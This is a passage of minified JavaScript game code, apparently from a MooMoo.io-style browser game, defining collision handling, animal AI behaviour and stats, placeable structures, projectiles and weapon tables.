                    h.yVel += w * m.boostSpeed * (m.weightM || 1) * Rt(m.dir)) : m.healCol ? h.healCol = m.healCol : m.teleport && (h.x = i.randInt(0, s.mapScale),
                                                                                                                                    h.y = i.randInt(0, s.mapScale));
                else {
                    const S = i.getAimerection(h.x, h.y, m.x, m.y);
                    if (i.getDistance(h.x, h.y, m.x, m.y),
                        m.isPlayer ? (k = k * -1 / 2,
                                      h.x += k * Ot(S),
                                      h.y += k * Rt(S),
                                      m.x -= k * Ot(S),
                                      m.y -= k * Rt(S)) : (h.x = m.x + D * Ot(S),// D is scales combined
                                                           h.y = m.y + D * Rt(S),
                                                           h.xVel *= .75,
                                                           h.yVel *= .75),
                        m.dmg && m.owner != h && !(m.owner && m.owner.team && m.owner.team == h.team)) {
                        h.changeHealth(-m.dmg, m.owner, m);
                        const O = 1.5 * (m.weightM || 1);
                        h.xVel += O * Ot(S),
                            h.yVel += O * Rt(S),
                            m.pDmg && !(h.skin && h.skin.poisonRes) && (h.dmgOverTime.dmg = m.pDmg,
                                                                        h.dmgOverTime.time = 5,
                                                                        h.dmgOverTime.doer = m.owner),
                            h.colDmg && m.health && (m.changeHealth(-h.colDmg) && this.disableObj(m),
                                                     this.hitObj(m, i.getAimerection(h.x, h.y, m.x, m.y)))
                    }
                }
                return m.zIndex > h.zIndex && (h.zIndex = m.zIndex),
                    !0
            }
        }
        return !1
    },
        this.checkCollision2 = function(e, t, n) {
        n = n || 1;
        var l = e.x2 - t.x,
            h = e.y2 - t.y,
            u = 35 + (t.realScale ?t.realScale:t.scale);
        if (Rs(l) <= u || Rs(h) <= u) {
            u = 35 + (t.getScale ? t.getScale() : t.scale);
            var f = pc(l * l + h * h) - u;
            if (f <= 0) {
                /* if (t.ignoreCollision) !t.trap || e.noTrap || t.owner == e || t.owner && t.owner.team &&
                        t.owner.team == e.team ? t.boostSpeed ? (e.xVel += n * t.boostSpeed * (t
                            .weightM || 1) * r(t.dir), e.yVel += n * t.boostSpeed * (t
                            .weightM || 1) * s(t.dir)) : t.healCol ? e.healCol = t.healCol : t
                        .teleport && (e.x = o.randInt(0, c.mapScale), e.y = o.randInt(0, c.mapScale)) :
                        (e.lockMove = !0, t.hideFromEnemy = !1);
                    else {
                        var d = o.getAimerection(e.x, e.y, t.x, t.y);
                        if (o.getDistance(e.x, e.y, t.x, t.y), t.isPlayer ? (f = -1 * f / 2, e.x += f *
                                r(d), e.y += f * s(d), t.x -= f * r(d), t.y -= f * s(d)) : (e
                                .x = t.x + u * r(d), e.y = t.y + u * s(d), e.xVel *= .75, e
                                .yVel *= .75), t.dmg && t.owner != e && (!t.owner || !t.owner
                                .team || t.owner.team != e.team)) {
                          //  e.changeHealth(-t.dmg, t.owner, t);
                          //  var p = 1.5 * (t.weightM || 1);
                           // e.xVel += p * r(d), e.yVel += p * s(d), !t.pDmg || e.skin && e.skin
                              //  .poisonRes || (e.dmgOverTime.dmg = t.pDmg, e.dmgOverTime.time =
                               //     5, e.dmgOverTime.doer = t.owner), e.colDmg && t
                               // .health && (t.changeHealth(-e.colDmg) && this.disableObj(t),
                                   // this.hitObj(t, o.getAimerection(e.x, e.y, t.x, t.y)))
                        }
                    }*/
                return t.zIndex > t.zIndex && (t.zIndex = t.zIndex),!0
            }
        }
        return !1
    }
}
function gc(e, t, i, s, n, r, o, l, c) {
    this.addProjectile = function(a, u, p, h, m, w, v, x, D) {
        const k = r.projectiles[w];
        let S;
        for (let O = 0; O < t.length; ++O)
            if (!t[O].active) {
                S = t[O];
                break
            }
        return S || (S = new e(i,s,n,r,o,l,c),
                     S.sid = t.length,
                     t.push(S)),
            S.init(w, a, u, p, m, k.dmg, h, k.scale, v),
            S.ignoreObj = x,
            S.layer = D || k.layer,
            S.src = k.src,
            S
    }
}
function yc(e, t, i, s, n, r, o, l, c) {
    this.aiTypes = [{
        id: 0,
        src: "cow_1",
        killScore: 150,
        health: 500,
        weightM: .8,
        speed: 95e-5,
        turnSpeed: .001,
        scale: 72,
        drop: ["food", 50]
    }, {
        id: 1,
        src: "pig_1",
        killScore: 200,
        health: 800,
        weightM: .6,
        speed: 85e-5,
        turnSpeed: .001,
        scale: 72,
        drop: ["food", 80]
    }, {
        id: 2,
        name: "Bull",
        src: "bull_2",
        hostile: !0,
        dmg: 20,
        killScore: 1e3,
        health: 1800,
        weightM: .5,
        speed: 94e-5,
        turnSpeed: 74e-5,
        scale: 78,
        viewRange: 800,
        chargePlayer: !0,
        drop: ["food", 100]
    }, {
        id: 3,
        name: "Bully",
        src: "bull_1",
        hostile: !0,
        dmg: 20,
        killScore: 2e3,
        health: 2800,
        weightM: .45,
        speed: .001,
        turnSpeed: 8e-4,
        scale: 90,
        viewRange: 900,
        chargePlayer: !0,
        drop: ["food", 400]
    }, {
        id: 4,
        name: "Wolf",
        src: "wolf_1",
        hostile: !0,
        dmg: 8,
        killScore: 500,
        health: 300,
        weightM: .45,
        speed: .001,
        turnSpeed: .002,
        scale: 84,
        viewRange: 800,
        chargePlayer: !0,
        drop: ["food", 200]
    }, {
        id: 5,
        name: "Quack",
        src: "chicken_1",
        dmg: 8,
        killScore: 2e3,
        noTrap: !0,
        health: 300,
        weightM: .2,
        speed: .0018,
        turnSpeed: .006,
        scale: 70,
        drop: ["food", 100]
    }, {
        id: 6,
        name: "MOOSTAFA",
        nameScale: 50,
        src: "enemy",
        hostile: !0,
        dontRun: !0,
        fixedSpawn: !0,
        spawnDelay: 6e4,
        noTrap: !0,
        colDmg: 100,
        dmg: 40,
        killScore: 8e3,
        health: 18e3,
        weightM: .4,
        speed: 7e-4,
        turnSpeed: .01,
        scale: 80,
        spriteMlt: 1.8,
        leapForce: .9,
        viewRange: 1e3,
        hitRange: 210,
        hitDelay: 1e3,
        chargePlayer: !0,
        drop: ["food", 100]
    }, {
        id: 7,
        name: "Treasure",
        hostile: !0,
        nameScale: 35,
        src: "crate_1",
        fixedSpawn: !0,
        spawnDelay: 12e4,
        colDmg: 200,
        killScore: 5e3,
        health: 2e4,
        weightM: .1,
        speed: 0,
        turnSpeed: 0,
        scale: 70,
        spriteMlt: 1
    }, {
        id: 8,
        name: "MOOFIE",
        src: "wolf_2",
        hostile: !0,
        fixedSpawn: !0,
        dontRun: !0,
        hitScare: 4,
        spawnDelay: 3e4,
        noTrap: !0,
        nameScale: 35,
        dmg: 10,
        colDmg: 100,
        killScore: 3e3,
        health: 7e3,
        weightM: .45,
        speed: .0015,
        turnSpeed: .002,
        scale: 90,
        viewRange: 800,
        chargePlayer: !0,
        drop: ["food", 1e3]
    }, {
        id: 9,
        name: "💀MOOFIE",
        src: "wolf_2",
        hostile: !0,
        fixedSpawn: !0,
        dontRun: !0,
        hitScare: 50,
        spawnDelay: 6e4,
        noTrap: !0,
        nameScale: 35,
        dmg: 12,
        colDmg: 100,
        killScore: 3e3,
        health: 9e3,
        weightM: .45,
        speed: .0015,
        turnSpeed: .0025,
        scale: 94,
        viewRange: 1440,
        chargePlayer: !0,
        drop: ["food", 3e3],
        minSpawnRange: .85,
        maxSpawnRange: .9
    }, {
        id: 10,
        name: "💀Wolf",
        src: "wolf_1",
        hostile: !0,
        fixedSpawn: !0,
        dontRun: !0,
        hitScare: 50,
        spawnDelay: 3e4,
        dmg: 10,
        killScore: 700,
        health: 500,
        weightM: .45,
        speed: .00115,
        turnSpeed: .0025,
        scale: 88,
        viewRange: 1440,
        chargePlayer: !0,
        drop: ["food", 400],
        minSpawnRange: .85,
        maxSpawnRange: .9
    }, {
        id: 11,
        name: "💀Bully",
        src: "bull_1",
        hostile: !0,
        fixedSpawn: !0,
        dontRun: !0,
        hitScare: 50,
        dmg: 20,
        killScore: 5e3,
        health: 5e3,
        spawnDelay: 1e5,
        weightM: .45,
        speed: .00115,
        turnSpeed: .0025,
        scale: 94,
        viewRange: 1440,
        chargePlayer: !0,
        drop: ["food", 800],
        minSpawnRange: .85,
        maxSpawnRange: .9
    }],
        this.spawn = function(a, u, p, h) {
        if (!this.aiTypes[h])
            return console.error("missing ai type", h),
                this.spawn(a, u, p, 0);
        let m;
        for (let w = 0; w < e.length; ++w)
            if (!e[w].active) {
                m = e[w];
                break
            }
        return m || (m = new t(e.length,n,i,s,o,r,l,c),
                     e.push(m)),
            m.init(a, u, p, h, this.aiTypes[h]),
            m
    }
}
const ot = Math.PI * 2
, Zi = 0;
function wc(e, t, i, s, n, r, o, l) {
    this.sid = e,
        this.isAI = !0,
        this.nameIndex = n.randInt(0, r.cowNames.length - 1),
        this.init = function(p, h, m, w, v) {
        this.x = p,
            this.y = h,
            this.startX = v.fixedSpawn ? p : null,
            this.startY = v.fixedSpawn ? h : null,
            this.xVel = 0,
            this.yVel = 0,
            this.zIndex = 0,
            this.dir = m,
            this.dirPlus = 0,
            this.index = w,
            this.src = v.src,
            v.name && (this.name = v.name),
            (this.name || "").startsWith("💀") && (this.isVolcanoAi = !0),
            this.weightM = v.weightM,
            this.speed = v.speed,
            this.killScore = v.killScore,
            this.turnSpeed = v.turnSpeed,
            this.scale = v.scale,
            this.maxHealth = v.health,
            this.health2 = 0,
            this.leapForce = v.leapForce,
            this.health = this.maxHealth,
            this.chargePlayer = v.chargePlayer,
            this.viewRange = v.viewRange,
            this.drop = v.drop,
            this.dmg = v.dmg,
            this.hostile = v.hostile,
            this.dontRun = v.dontRun,
            this.hitRange = v.hitRange,
            this.hitDelay = v.hitDelay,
            this.hitScare = v.hitScare,
            this.spriteMlt = v.spriteMlt,
            this.nameScale = v.nameScale,
            this.colDmg = v.colDmg,
            this.noTrap = v.noTrap,
            this.spawnDelay = v.spawnDelay,
            this.minSpawnRange = v.minSpawnRange,
            this.maxSpawnRange = v.maxSpawnRange,
            this.hitWait = 0,
            this.waitCount = 1e3,
            this.moveCount = 0,
            this.targetAimer = 0,
            this.active = !0,
            this.alive = !0,
            this.runFrom = null,
            this.chargeTarget = null,
            this.dmgOverTime = {}
    }
        ,
        this.getVolcanoAggression = function() {
        const p = n.getDistance(this.x, this.y, r.volcanoLocationX, r.volcanoLocationY)
        , h = p > r.volcanoAggressionRadius ? 0 : r.volcanoAggressionRadius - p;
        return 1 + r.volcanoAggressionPercentage * (1 - h / r.volcanoAggressionRadius)
    }
    ;
    let c = 0;
    this.update = function(p) {
        if (this.active) {
            if (this.spawnCounter) {
                if (this.spawnCounter -= p * (1 + 0) * this.getVolcanoAggression(),
                    this.spawnCounter <= 0)
                    if (this.spawnCounter = 0,
                        this.minSpawnRange || this.maxSpawnRange) {
                        const W = r.mapScale * this.minSpawnRange
                        , F = r.mapScale * this.maxSpawnRange;
                        this.x = n.randInt(W, F),
                            this.y = n.randInt(W, F)
                    } else
                        this.x = this.startX || n.randInt(0, r.mapScale),
                            this.y = this.startY || n.randInt(0, r.mapScale);
                return
            }
            c -= p,
                c <= 0 && (this.dmgOverTime.dmg && (this.changeHealth(-this.dmgOverTime.dmg, this.dmgOverTime.doer),
                                                    this.dmgOverTime.time -= 1,
                                                    this.dmgOverTime.time <= 0 && (this.dmgOverTime.dmg = 0)),
                           c = 1e3);
            let k = !1
            , S = 1;
            if (!this.zIndex && !this.lockMove && this.y >= r.mapScale / 2 - r.riverWidth / 2 && this.y <= r.mapScale / 2 + r.riverWidth / 2 && (S = .33,
                                                                                                                                                 this.xVel += r.waterCurrent * p),
                this.lockMove)
                this.xVel = 0,
                    this.yVel = 0;
            else if (this.waitCount > 0) {
                if (this.waitCount -= p,
                    this.waitCount <= 0)
                    if (this.chargePlayer) {
                        let W, F, _;
                        for (var h = 0; h < i.length; ++h)
                            i[h].alive && !(i[h].skin && i[h].skin.bullRepel) && (_ = n.getDistance(this.x, this.y, i[h].x, i[h].y),
                                                                                  _ <= this.viewRange && (!W || _ < F) && (F = _,
                                                                                                                           W = i[h]));
                        W ? (this.chargeTarget = W,
                             this.moveCount = n.randInt(8e3, 12e3)) : (this.moveCount = n.randInt(1e3, 2e3),
                                                                       this.targetAimer = n.randFloat(-PI, PI))
                    } else
                        this.moveCount = n.randInt(4e3, 1e4),
                            this.targetAimer = n.randFloat(-PI, PI)
            } else if (this.moveCount > 0) {
                var m = this.speed * S * (1 + r.MAX_SPEED * Zi) * this.getVolcanoAggression();
                if (this.runFrom && this.runFrom.active && !(this.runFrom.isPlayer && !this.runFrom.alive) ? (this.targetAimer = n.getAimerection(this.x, this.y, this.runFrom.x, this.runFrom.y),
                                                                                                              m *= 1.42) : this.chargeTarget && this.chargeTarget.alive && (this.targetAimer = n.getAimerection(this.chargeTarget.x, this.chargeTarget.y, this.x, this.y),
                m *= 1.75,
                k = !0),
                    this.hitWait && (m *= .3),
                    this.dir != this.targetAimer) {
                    this.dir %= ot;
                    const W = (this.dir - this.targetAimer + ot) % ot
                    , F = min(abs(W - ot), W, this.turnSpeed * p)
                    , _ = W - PI >= 0 ? 1 : -1;
                    this.dir += _ * F + ot
                }
                this.dir %= ot,
                    this.xVel += m * p * cos(this.dir),
                    this.yVel += m * p * sin(this.dir),
                    this.moveCount -= p,
                    this.moveCount <= 0 && (this.runFrom = null,
                                            this.chargeTarget = null,
                                            this.waitCount = this.hostile ? 1500 : n.randInt(1500, 6e3))
            }
            this.zIndex = 0,
                this.lockMove = !1;
            var w;
            const O = n.getDistance(0, 0, this.xVel * p, this.yVel * p)
            , U = min(4, max(1, round(O / 40)))
            , L = 1 / U;
            for (var h = 0; h < U; ++h) {
                this.xVel && (this.x += this.xVel * p * L),
                    this.yVel && (this.y += this.yVel * p * L),
                    w = t.getGridArrays(this.x, this.y, this.scale);
                for (var v = 0; v < w.length; ++v)
                    for (let F = 0; F < w[v].length; ++F)
                        w[v][F].active && t.checkCollision(this, w[v][F], L)
            }
            let q = !1;
            if (this.hitWait > 0 && (this.hitWait -= p,
                                     this.hitWait <= 0)) {
                q = !0,
                    this.hitWait = 0,
                    this.leapForce && !n.randInt(0, 2) && (this.xVel += this.leapForce * cos(this.dir),
                                                           this.yVel += this.leapForce * sin(this.dir));
                var w = t.getGridArrays(this.x, this.y, this.hitRange), x, D;
                for (let F = 0; F < w.length; ++F)
                    for (var v = 0; v < w[F].length; ++v)
                        x = w[F][v],
                            x.health && (D = n.getDistance(this.x, this.y, x.x, x.y),
                                         D < x.scale + this.hitRange && (x.changeHealth(-this.dmg * 5) && t.disableObj(x),
                                                                         t.hitObj(x, n.getAimerection(this.x, this.y, x.x, x.y))));
                for (var v = 0; v < i.length; ++v)
                    i[v].canSee(this) && l.send(i[v].id, "J", this.sid)
            }
            if (k || q) {
                var x, D;
                let _;
                for (var h = 0; h < i.length; ++h)
                    x = i[h],
                        x && x.alive && (D = n.getDistance(this.x, this.y, x.x, x.y),
                                         this.hitRange ? !this.hitWait && D <= this.hitRange + x.scale && (q ? (_ = n.getAimerection(x.x, x.y, this.x, this.y),
                                                                                                                x.changeHealth(-this.dmg * (1 + r.MAX_ATTACK * Zi) * this.getVolcanoAggression()),
                                                                                                                x.xVel += .6 * cos(_),
                                                                                                                x.yVel += .6 * sin(_),
                                                                                                                this.runFrom = null,
                                                                                                                this.chargeTarget = null,
                                                                                                                this.waitCount = 3e3,
                                                                                                                this.hitWait = n.randInt(0, 2) ? 0 : 600) : this.hitWait = this.hitDelay) : D <= this.scale + x.scale && (_ = n.getAimerection(x.x, x.y, this.x, this.y),
                    x.changeHealth(-this.dmg * (1 + r.MAX_ATTACK * Zi) * this.getVolcanoAggression()),
                    x.xVel += .55 * cos(_),
                    x.yVel += .55 * sin(_)))
            }
            this.xVel && (this.xVel *= pow(r.playerDecel, p)),
                this.yVel && (this.yVel *= pow(r.playerDecel, p));
            const P = this.scale;
            this.x - P < 0 ? (this.x = P,
                              this.xVel = 0) : this.x + P > r.mapScale && (this.x = r.mapScale - P,
                                                                           this.xVel = 0),
                this.y - P < 0 ? (this.y = P,
                                  this.yVel = 0) : this.y + P > r.mapScale && (this.y = r.mapScale - P,
                                                                               this.yVel = 0),
                this.isVolcanoAi && (this.chargeTarget && (n.getDistance(this.chargeTarget.x, this.chargeTarget.y, r.volcanoLocationX, r.volcanoLocationY) || 0) > r.volcanoAggressionRadius && (this.chargeTarget = null),
                                     this.xVel && (this.x < r.volcanoLocationX - r.volcanoAggressionRadius ? (this.x = r.volcanoLocationX - r.volcanoAggressionRadius,
                                                                                                              this.xVel = 0) : this.x > r.volcanoLocationX + r.volcanoAggressionRadius && (this.x = r.volcanoLocationX + r.volcanoAggressionRadius,
            this.xVel = 0)),
                                     this.yVel && (this.y < r.volcanoLocationY - r.volcanoAggressionRadius ? (this.y = r.volcanoLocationY - r.volcanoAggressionRadius,
                                                                                                              this.yVel = 0) : this.y > r.volcanoLocationY + r.volcanoAggressionRadius && (this.y = r.volcanoLocationY + r.volcanoAggressionRadius,
            this.yVel = 0)))
        }
    }
        ,
        this.canSee = function(p) {
        if (!p || p.skin && p.skin.invisTimer && p.noMovTimer >= p.skin.invisTimer)
            return !1;
        const h = abs(p.x - this.x) - p.scale
        , m = abs(p.y - this.y) - p.scale;
        return h <= r.maxScreenWidth / 2 * 1.3 && m <= r.maxScreenHeight / 2 * 1.3
    }
    ;
    let a = 0
    , u = 0;
    this.animate = function(p) {
        this.animTime > 0 && (this.animTime -= p,
                              this.animTime <= 0 ? (this.animTime = 0,
                                                    this.dirPlus = 0,
                                                    a = 0,
                                                    u = 0) : u == 0 ? (a += p / (this.animSpeed * r.hitReturnRatio),
                                                                       this.dirPlus = n.lerp(0, this.targetAngle, min(1, a)),
                                                                       a >= 1 && (a = 1,
                                                                                  u = 1)) : (a -= p / (this.animSpeed * (1 - r.hitReturnRatio)),
                                                                                             this.dirPlus = n.lerp(0, this.targetAngle, max(0, a))))
    }
        ,
        this.startAnim = function() {
        this.animTime = this.animSpeed = 600,
            this.targetAngle = PI * .8,
            a = 0,
            u = 0
    }
        ,
        this.changeHealth = function(p, h, m) {
        if (this.active && (this.health += p,
                            m && (this.hitScare && !n.randInt(0, this.hitScare) ? (this.runFrom = m,
                                                                                   this.waitCount = 0,
                                                                                   this.moveCount = 2e3) : this.hostile && this.chargePlayer && m.isPlayer ? (this.chargeTarget = m,
        this.waitCount = 0,
        this.moveCount = 8e3) : this.dontRun || (this.runFrom = m,
                                                 this.waitCount = 0,
                                                 this.moveCount = 2e3)),
                            p < 0 && this.hitRange && n.randInt(0, 1) && (this.hitWait = 500),
                            h && h.canSee(this) && p < 0 && l.send(h.id, "8", round(this.x), round(this.y), round(-p), 1),
                            this.health <= 0)) {
            if (this.spawnDelay)
                this.spawnCounter = this.spawnDelay,
                    this.x = -1e6,
                    this.y = -1e6;
            else if (this.minSpawnRange || this.maxSpawnRange) {
                const w = r.mapScale * this.minSpawnRange
                , v = r.mapScale * this.maxSpawnRange;
                this.x = n.randInt(w, v),
                    this.y = n.randInt(w, v)
            } else
                this.x = this.startX || n.randInt(0, r.mapScale),
                    this.y = this.startY || n.randInt(0, r.mapScale);
            if (this.health = this.maxHealth,
                this.runFrom = null,
                h && (o(h, this.killScore),
                      this.drop))
                for (let w = 0; w < this.drop.length; )
                    h.addResource(r.resourceTypes.indexOf(this.drop[w]), this.drop[w + 1]),
                        w += 2
        }
    }
}
function kc(e) {
    this.sid = e,
        this.init = function(t, i, s, n, r, o, l, bot, spectate, fake, restricter, preplace) {
        o = o || {},
            this.sentTo = {},
            this.gridLocations = [],
            this.active = !0,
            this.doUpdate = o.doUpdate,
            this.x = t,
            this.y = i,
            this.dir = s,
            this.xWiggle = 0,
            this.yWiggle = 0,
            this.scale = n,
            this.type = r,
            this.id = o.id,
            this.owner = l,
            this.name = o.name ? o.name : this.type === 0 ? "Tree" : this.type === 1 && this.y>=12000 ? "Cactus" : this.type === 1 ? "Bush" : this.type === 2 ? "Stone" : this.type === 3 ? "Gold Stone" : null,
            this.isItem = this.id != null,
            this.group = o.group,
            this.health = this.maxHealth = o.health;
        this.health2 = 0,
            this.buildingID = o.buildingID,
            this.setType = o.setType,
            this.layer = 2,
            this.group != null ? this.layer = this.group.layer : this.type == 0 ? this.layer = 3 : this.type == 2 ? this.layer = 0 : this.type == 4 && (this.layer = -1),
            this.colDiv = o.colDiv || 1,
            this.blocker = o.blocker,
            this.ignoreCollision = o.ignoreCollision,
            this.dontGather = o.dontGather,
            this.hideFromEnemy = o.hideFromEnemy,
            this.friction = o.friction,
            this.projDmg = o.projDmg,
            this.dmg = o.dmg,
            this.pDmg = o.pDmg,
            this.pps = o.pps,
            this.zIndex = o.zIndex || 0,
            this.turnSpeed = o.turnSpeed,
            this.req = o.req,
            this.trap = o.trap,
            this.healCol = o.healCol,
            this.teleport = o.teleport,
            this.boostSpeed = o.boostSpeed,
            this.projectile = o.projectile,
            this.opacity = o.name == "pit trap" ? 1 : 1,
            this.opacity2 = 1,
            this.fadingOut = false,
            this.dmgpot = 0,
            this.assumeBreak = false,
            this.ignoreWiggleDirs = [],
            this.wiggleDirs = [],
            this.shootRange = o.shootRange,
            this.shootRate = o.shootRate,
            this.shootCount = this.shootRate,
            this.spawnPoint = o.spawnPoint,
            this.tick = tick,
            this.preplace = preplace,
            this.fake = fake,
            this.bot = bot,
            this.elevation = typeof this.type === "number" && this.owner === null || this.name == "turret" || this?.group?.name === "mill" ? 2 : 1,
            this.restricter = restricter,
            this.realScale = this.type <= 1 && this.type !== null ? this.scale * .6 : this.scale
        this.pathScale =
            this.type===1&&this.y<=12000 ?this.scale*.6+15
        : this.type===0 ? this.scale*.7+10
        : this.dmg && !clan(this?.owner?.sid)||this.teleport || this.boostSpeed ? this.scale+47
        : this.type===1&&this.y>=12000 ? this.scale*.55+47
        : this.name == 'pit trap' && !clan(this?.owner?.sid) ? this.scale+38
        : this.ignoreCollision ? 0
        : this.scale+10
    }
        ,
        this.changeHealth = function(t, i) {
        return this.health += t,
            this.health <= 0
    }
        ,
        this.getScale = function(t, i) {
        return t = t || 1,
            this.scale * (this.isItem || this.type == 2 || this.type == 3 || this.type == 4 ? 1 : .6 * t) * (i ? 1 : this.colDiv)
    }
        ,
        this.visibleToPlayer = function(t) {
        return !this.hideFromEnemy || this.owner && (this.owner == t || this.owner.team && t.team == this.owner.team)
    }
        ,
        this.update = function(t) {
        this.active && (this.xWiggle && (this.xWiggle *= pow(.99, t)),
                        this.yWiggle && (this.yWiggle *= pow(.99, t)),
                        ( this?.group?.name == "mill" || this?.group?.name != "mill") && this.turnSpeed && (this.dir += this.turnSpeed * t))
    }
}
const j = [{
    id: 0,
    name: "food",
    layer: 0
}, {
    id: 1,
    name: "walls",
    place: !0,
    limit: 30,
    layer: 0
}, {
    id: 2,
    name: "spikes",
    place: !0,
    limit: 15,
    layer: 0
}, {
    id: 3,
    name: "mill",
    place: !0,
    limit: 7,
    sandboxLimit: 299,
    layer: 1
}, {
    id: 4,
    name: "mine",
    place: !0,
    limit: 1,
    layer: 0
}, {
    id: 5,
    name: "trap",
    place: !0,
    limit: 6,
    layer: -1
}, {
    id: 6,
    name: "booster",
    place: !0,
    limit: 12,
    sandboxLimit: 299,
    layer: -1
}, {
    id: 7,
    name: "turret",
    place: !0,
    limit: 2,
    layer: 1
}, {
    id: 8,
    name: "watchtower",
    place: !0,
    limit: 12,
    layer: 1
}, {
    id: 9,
    name: "buff",
    place: !0,
    limit: 4,
    layer: -1
}, {
    id: 10,
    name: "spawn",
    place: !0,
    limit: 1,
    layer: -1
}, {
    id: 11,
    name: "sapling",
    place: !0,
    limit: 2,
    layer: 0
}, {
    id: 12,
    name: "blocker",
    place: !0,
    limit: 3,
    layer: -1
}, {
    id: 13,
    name: "teleporter",
    place: !0,
    limit: 2,
    sandboxLimit: 299,
    layer: -1
}]
, vc = [{
    indx: 0,
    layer: 0,
    src: "arrow_1",
    dmg: 25,
    speed: 1.6,
    scale: 103,
    range: 1e3
}, {
    indx: 1,
    layer: 1,
    dmg: 25,
    speed: 1.5,
    scale: 20
}, {
    indx: 0,
    layer: 0,
    src: "arrow_1",
    dmg: 35,
    speed: 2.5,
    scale: 103,
    range: 1200
}, {
    indx: 0,
    layer: 0,
    src: "arrow_1",
    dmg: 30,
    speed: 2,
    scale: 103,
    range: 1200
}, {
    indx: 1,
    layer: 1,
    dmg: 16,
    scale: 20
}, {
    indx: 0,
    layer: 0,
    src: "bullet_1",
    dmg: 50,
    speed: 3.6,
    scale: 160,
    range: 1400
}]
, xc = [{
    id: 0,
    type: 0,
    name: "tool hammer",
    uF:[],
    desc: "tool for gathering all resources",
    age: 1,
    src: "hammer_1",
    length: 140,
    width: 140,
    xOff: -3,
    yOff: 18,
    dmg: 25,
    spdMult: 1,
    range: 65,
    gather: 1,
    speed: 300
}, {
    id: 1,
    type: 0,
    age: 2,
    uF: [0],
    name: "hand axe",
    desc: "gathers resources at a higher rate",
    src: "axe_1",
    length: 140,
    width: 140,
    xOff: 3,
    yOff: 24,
    dmg: 30,
    spdMult: 1,
    range: 70,
    gather: 2,
    speed: 400
}, {
    id: 2,
    type: 0,
    age: 8,
    uF:[1,0,15,12,13,null],
    pre: 1,
    name: "great axe",
    desc: "deal more damage and gather more resources",
    src: "great_axe_1",
    length: 140,
    width: 140,
    xOff: -8,
    yOff: 25,
    dmg: 35,
    spdMult: 1,
    range: 75,
    gather: 4,
    speed: 400
}, {
    id: 3,
    type: 0,
    age: 2,
    uF: [0,4],
    name: "short sword",
    desc: "increased attack power but slower move speed",
    src: "sword_1",
    iPad: 1.3,
    length: 130,
    width: 210,
    xOff: -8,
    yOff: 46,
    dmg: 35,
    spdMult: .85,
    range: 110,
    gather: 1,
    speed: 300
}, {
    id: 4,
    type: 0,
    uF: [3,0,15,12,13,null,9],
    age: 8,
    pre: 3,
    name: "katana",
    desc: "greater range and damage",
    src: "samurai_1",
    iPad: 1.3,
    length: 130,
    width: 210,
    xOff: -8,
    yOff: 59,
    dmg: 40,
    spdMult: .8,
    range: 118,
    gather: 1,
    speed: 300
}, {
    id: 5,
    type: 0,
    age: 2,
    uF:[0],
    name: "polearm",
    desc: "long range melee weapon",
    src: "spear_1",
    iPad: 1.3,
    length: 130,
    width: 210,
    xOff: -8,
    yOff: 53,
    dmg: 45,
    knock: .2,
    spdMult: .82,
    range: 142,
    gather: 1,
    speed: 700
}, {
    id: 6,
    type: 0,
    age: 2,
    uF:[0],
    name: "bat",
    desc: "fast long range melee weapon",
    src: "bat_1",
    iPad: 1.3,
    length: 110,
    width: 180,
    xOff: -8,
    yOff: 53,
    dmg: 20,
    spdMult: 1,
    knock: .7,
    range: 110,
    gather: 1,
    speed: 300
}, {
    id: 7,
    type: 0,
    age: 2,
    uF: [0],
    name: "daggers",
    desc: "really fast short range weapon",
    src: "dagger_1",
    iPad: .8,
    length: 110,
    width: 110,
    xOff: 18,
    yOff: 0,
    dmg: 20,
    knock: .1,
    range: 65,
    gather: 1,
    hitSlow: .1,
    spdMult: 1.13,
    speed: 100
}, {
    id: 8,
    type: 0,
    age: 2,
    uF: [0],
    name: "stick",
    desc: "great for gathering but very weak",
    src: "stick_1",
    length: 140,
    width: 140,
    xOff: 3,
    yOff: 24,
    dmg: 1,
    spdMult: 1,
    range: 70,
    gather: 7,
    speed: 400
}, {
    id: 9,
    type: 1,
    age: 6,
    uF: [null],
    name: "hunting bow",
    desc: "bow used for ranged combat and hunting",
    src: "bow_1",
    req: ["wood", 4,'ez',0],
    length: 120,
    width: 120,
    xOff: -6,
    dmg: 25,
    yOff: 0,
    projSpd: 1.6,
    projectile: 0,
    spdMult: .75,
    speed: 600
}, {
    id: 10,
    type: 1,
    age: 6,
    uF: [null],
    name: "great hammer",
    desc: "hammer used for destroying structures",
    src: "great_hammer_1",
    length: 140,
    width: 140,
    xOff: -9,
    yOff: 25,
    dmg: 10,
    spdMult: .88,
    range: 75,
    sDmg: 7.5,
    gather: 1,
    speed: 400
}, {
    id: 11,
    type: 1,
    age: 6,
    uF: [null],
    name: "wooden shield",
    desc: "blocks projectiles and reduces melee damage",
    src: "shield_1",
    length: 120,
    dmg:0,
    width: 120,
    shield: .2,
    xOff: 6,
    yOff: 0,
    spdMult: .7,
    speed: 1
}, {
    id: 12,
    type: 1,
    age: 8,
    pre: 9,
    uF:[9,null,4],
    name: "crossbow",
    desc: "deals more damage and has greater range",
    src: "crossbow_1",
    req: ["wood", 5,'ez',0],
    aboveHand: !0,
    armS: .75,
    length: 120,
    width: 120,
    xOff: -4,
    yOff: 0,
    dmg:35,
    projSpd: 2.5,
    projectile: 2,
    spdMult: .7,
    speed: 700
}, {
    id: 13,
    type: 1,
    age: 9,
    uF:[12,9,null,4,2],
    pre: 12,
    name: "repeater crossbow",
    desc: "high firerate crossbow with reduced damage",
    src: "crossbow_2",
    req: ["wood", 10,'ez',0],
    aboveHand: !0,
    armS: .75,
    length: 120,
    width: 120,
    xOff: -4,
    dmg: 30,
    yOff: 0,
    projSpd: 2,
    projectile: 3,
    spdMult: .7,
    speed: 230
}, {
    id: 14,
    type: 1,
    age: 6,
    uF: [null],
    name: "mc grabby",
    desc: "steals resources from enemies",
    src: "grab_1",
    length: 130,
    width: 210,
    xOff: -8,
    yOff: 53,
    dmg: 0,
    steal: 250,
    knock: .2,
    spdMult: 1.05,
    range: 125,
    gather: 0,
    speed: 700
}, {
    id: 15,
    type: 1,
    age: 9,
    uF: [12,9,null,4,2],
    pre: 12,
    name: "musket",
    desc: "slow firerate but high damage and range",
    src: "musket_1",
    req: ["stone", 10,'ez',0],
    aboveHand: !0,
    dmg:50,
    rec: .35,
    armS: .6,
    hndS: .3,
    hndD: 1.6,
    length: 205,
    width: 205,
    xOff: 25,
    yOff: 0,
    projectile: 5,
    projSpd: 3.6,
    hideProjectile: !0,
    spdMult: .6,
    speed: 1500
}]
, dt = [{
    group: j[0],
    name: "apple",
    desc: "restores 20 health when consumed",
    req: ["food", 10],
    consume: function(e) {
        return e.changeHealth(20, e)
    },
    scale: 22,
